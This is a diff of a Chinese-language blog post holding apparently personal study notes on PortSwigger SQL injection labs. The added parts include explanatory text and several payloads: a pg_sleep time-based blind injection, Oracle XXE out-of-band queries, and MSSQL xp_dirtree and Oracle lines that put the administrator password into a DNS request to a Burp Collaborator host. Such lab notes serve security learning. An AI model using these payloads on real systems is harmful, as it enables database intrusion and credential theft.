@@ -479,14 +479,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2023-03-08
+                    2023-03-12
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    379
+                    1.7k
                 </div>
                 
 
@@ -517,12 +517,12 @@ id="sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-dat
 injection vulnerability in WHERE clause allowing retrieval of hidden
 data</h4>
 <ul>
-<li><p>Web应用程序可能会将用户输入的空格作为SQL查询字符串中的分隔符<img
+<li>Web应用程序可能会将用户输入的空格作为SQL查询字符串中的分隔符<img
 src="https://s2.loli.net/2023/03/06/brl8wskQR4COuHI.png"
-alt="image-20230306054219801" /></p></li>
-<li><p>protocol error<img
+alt="image-20230306054219801" /></li>
+<li>protocol error<img
 src="https://s2.loli.net/2023/03/06/wGTusUkSzpYOJax.png"
-alt="image-20230306054301457" /></p></li>
+alt="image-20230306054301457" /></li>
 </ul>
 <h4 id="retrieving-hidden-data">Retrieving hidden data</h4>
 <h4 id="subverting-application-logic">Subverting application logic</h4>
@@ -560,12 +560,43 @@ NULL,NULL,NULL--</p>
 <h4 id="blind-sql-injection-vulnerabilities">Blind SQL injection
 vulnerabilities</h4>
 <ul>
-<li><p>Time delay</p></li>
-<li><p><a
+<li>Time delay</li>
+<li><a
 target="_blank" rel="noopener" href="https://portswigger.net/burp/application-security-testing/oast">OAST</a>
-techniques.</p></li>
-<li><p>payload</p>
-<pre class="language-sql" data-language="sql"><code class="language-sql">xyz<span class="token string">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class="token string">'), 1, 1) > '</span>m</code></pre></li>
+techniques.</li>
+<li>payload</li>
+<li>TrackingId:</li>
+</ul>
+<blockquote>
+<p>tracking id 解释:</p>
+<p><code>TrackingId</code>（追踪ID）通常是一种用于跟踪用户行为或请求的标识符。在
+Web 应用程序中，<code>TrackingId</code>
+通常会随着用户的每个请求而变化，以便应用程序可以跟踪用户在应用程序中的活动。</p>
+<p>然而，如果 Web 应用程序没有正确地过滤和验证 <code>TrackingId</code>
+参数，攻击者就可以通过在该参数中注入恶意代码来攻击应用程序。通过注入恶意代码，攻击者可以执行各种操作，例如访问、修改、删除敏感数据，或者获取系统权限。</p>
+<p>因此，对于任何 Web
+应用程序，都应该对所有输入参数进行严格的验证和过滤，以确保它们不包含任何恶意代码。</p>
+<p>与cookie session:</p>
+<p>Cookie 和 Session 都是用于在 Web
+应用程序中跟踪用户身份和状态的机制。</p>
+<p>Cookie 是一种在客户端存储数据的机制，可以在 Web
+应用程序和客户端之间传递数据。通过设置 Cookie，Web
+应用程序可以跟踪用户的身份和状态，并在后续的请求中使用该信息。例如，Web
+应用程序可以使用 Cookie
+存储用户的登录凭证，以便在用户下一次访问时自动登录。</p>
+<p>Session 是一种在服务器端存储数据的机制，用于跟踪用户的身份和状态。Web
+应用程序可以创建一个 Session 对象，并将用户的身份和状态存储在其中。每个
+Session 对象都有一个唯一的标识符，该标识符通常存储在用户的 Cookie
+中。在用户的后续请求中，Web 应用程序可以使用该标识符来查找 Session
+对象，并从中获取用户的身份和状态。</p>
+<p>与 Cookie 相比，Session
+更加安全，因为它的数据存储在服务器端，而不是在客户端。然而，Session
+对象需要消耗服务器资源，因此 Web
+应用程序应该谨慎使用。为了减轻服务器的负担，Web 应用程序通常会将 Session
+数据存储在缓存中，或者将其存储在数据库或文件系统中。</p>
+</blockquote>
+<pre class="language-sql" data-language="sql"><code class="language-sql">xyz<span class="token string">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span>Administrator<span class="token string">'), 1, 1) > '</span>m</code></pre>
+<ul>
 <li><p>Blind SQL injection with conditional responses<img
 src="https://s2.loli.net/2023/03/07/8wuVmbezWTv5iqL.png"
 alt="image-20230307191232729" /></p></li>
@@ -603,7 +634,76 @@ alt="image-20230308012032743" /><img
 src="https://s2.loli.net/2023/03/08/8eQsWvpOnwdfVNz.png"
 alt="image-20230308012126649" /></p></li>
 </ul></li>
+<li><h4
+id="exploiting-blind-sql-injection-by-triggering-time-delays">Exploiting
+blind SQL injection by triggering time delays</h4>
+<ul>
+<li><p>payload<img
+src="https://s2.loli.net/2023/03/11/EmK2TtPrGq4fy7g.png"
+alt="image-20230311181114133" /></p></li>
+<li><p>Blind SQL injection with time delays and information
+retrieval</p></li>
+<li><p>payload<img
+src="https://s2.loli.net/2023/03/11/jhBeTksglyC1E3w.png"
+alt="image-20230311184732559" /></p></li>
+<li><p>payload</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>x<span class="token string">'%3BSELECT+CASE+WHEN+(username='</span>administrator'<span class="token operator">+</span><span class="token operator">AND</span><span class="token operator">+</span>LENGTH<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">THEN</span><span class="token operator">+</span>pg_sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">ELSE</span><span class="token operator">+</span>pg_sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">END</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>users<span class="token comment">--</span></code></pre></li>
+</ul></li>
+<li><p>Exploiting blind SQL injection using out-of-band (<a
+target="_blank" rel="noopener" href="https://portswigger.net/burp/application-security-testing/oast">OAST</a>)
+techniques</p>
+<ul>
+<li><p>payload<img
+src="https://s2.loli.net/2023/03/11/g36OKNRwBdYbsMy.png"
+alt="image-20230311194719172" /></p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">TrackingId<span class="token operator">=</span>x<span class="token string">'+UNION+SELECT+EXTRACTVALUE(xmltype('</span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token number">3</span>fxml<span class="token operator">+</span>version<span class="token operator">%</span><span class="token number">3</span>d<span class="token string">"1.0"</span><span class="token operator">+</span>encoding<span class="token operator">%</span><span class="token number">3</span>d<span class="token string">"UTF-8"</span><span class="token operator">%</span><span class="token number">3</span>f<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE<span class="token operator">+</span>root<span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY<span class="token operator">+</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">+</span>remote<span class="token operator">+</span>SYSTEM<span class="token operator">+</span><span class="token string">"http%3a//BURP-COLLABORATOR-SUBDOMAIN/"</span><span class="token operator">></span><span class="token operator">+</span><span class="token operator">%</span><span class="token number">25</span>remote<span class="token operator">%</span><span class="token number">3</span>b<span class="token punctuation">]</span><span class="token operator">></span><span class="token string">'),'</span><span class="token operator">/</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>dual<span class="token comment">--</span></code></pre>
+<blockquote>
+<ul>
+<li>xmltype: Oracle数据库中用于处理XML类型数据的函数</li>
+<li>'&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/"&gt;+%25remote%3b]&gt;':
+这是一个XML实体，它定义了一个名为“remote”的实体，其值为"<a
+target="_blank" rel="noopener" href="http://burp-collaborator-subdomain/%22。注意，在URL中的斜杠（/）被URL编码为“%2f”，因此需要使用“%3a”代替冒号（:），使用“%2f”代替斜杠（/）。">http://BURP-COLLABORATOR-SUBDOMAIN/"。注意，在URL中的斜杠（/）被URL编码为“%2f”，因此需要使用“%3a”代替冒号（:），使用“%2f”代替斜杠（/）。</a></li>
+<li>/1:
+这是XPath表达式，它将从XML文档中提取根节点（root）的“1”元素的值。</li>
+<li>EXTRACTVALUE:
+这是Oracle数据库中用于提取XML类型数据中特定元素或属性的函数。</li>
+<li>FROM dual:
+dual是Oracle数据库中的一个虚拟表，它只有一行一列，并且用于执行一些特殊的查询。在这种情况下，它用作SELECT语句的来源，因为我们不需要从实际的表中提取数据，而只需要使用EXTRACTVALUE函数从XML实体中提取值。</li>
 </ul>
+<p>因此，该注入利用了一个XML实体来提取远程服务器上的值，并使用XPath表达式从该值中提取数据。同时，由于实体的定义中包含了一个指向Burp
+Collaborator Server的URL，因此在注入成功时，攻击者将能够通过Burp
+Collaborator来收集关于目标服务器的敏感信息。</p>
+</blockquote>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#payload</span>
+<span class="token string">'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='</span>Administrator<span class="token string">');exec('</span>master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token string">"//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"</span>'<span class="token punctuation">)</span><span class="token comment">--</span>
+
+
+<span class="token string">'master..xp_dirtree "//'</span><span class="token operator">+</span><span class="token variable">@p</span><span class="token operator">+</span><span class="token string">'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a" 解释这部分:
+
+
+
+这部分代码包含了一个字符串，用于构建一个URL，并将其作为参数传递给系统存储过程master..xp_dirtree。
+
+该字符串包含以下部分：
+
+1. master..xp_dirtree：系统存储过程的名称。
+2. //：URL的协议部分，用双斜杠表示。
+3. '</span><span class="token operator">+</span><span class="token variable">@p</span><span class="token operator">+</span><span class="token string">'：一个变量，用于存储从数据库中检索到的管理员密码。加号用于将该变量与其他字符串连接起来。
+4. .cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net：Burp Collaborator服务器的地址。
+5. /a：URL的路径部分。
+
+将这些部分组合在一起，可以得到类似以下的URL：
+
+//管理员密码.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a
+
+这个URL将被传递给系统存储过程master..xp_dirtree，该过程将尝试列出该URL路径下的所有文件和目录。但在这种情况下，该URL实际上将向Burp Collaborator发送请求，以便攻击者确认注入是否成功。
+
+TrackingId=x'</span><span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span><span class="token operator">+</span>EXTRACTVALUE<span class="token punctuation">(</span>xmltype<span class="token punctuation">(</span><span class="token string">'&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token operator">+</span>password<span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>users<span class="token operator">+</span><span class="token keyword">WHERE</span><span class="token operator">+</span>username<span class="token operator">%</span><span class="token number">3</span>d<span class="token string">'administrator'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/l'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">FROM</span><span class="token operator">+</span>dual<span class="token comment">--</span>
+
+</code></pre></li>
+</ul></li>
+</ul>
+<p>​</p>
 
                 
             </div>
@@ -1213,7 +1313,7 @@ alt="image-20230308012126649" /></p></li>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">63.2k</span>&nbsp;字
+                class="white-color">64.5k</span>&nbsp;字
             
             
             
